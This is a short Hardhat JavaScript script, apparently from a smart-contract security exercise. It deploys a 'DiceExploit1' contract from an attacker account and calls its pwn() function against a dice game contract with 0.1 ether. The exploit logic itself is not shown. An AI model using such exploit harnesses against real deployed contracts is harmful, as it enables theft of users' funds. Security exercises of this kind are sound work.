const { ethers } = require('hardhat');

module.exports = async (dice, attacker) => {

  const Exploit = await ethers.getContractFactory('DiceExploit1', attacker);
  const exploit = await Exploit.deploy({ gasPrice: '0' });
  await exploit.deployed();

  await exploit.pwn(
    dice.address,
    {
      value: ethers.utils.parseEther('0.1'),
    },
  );
};
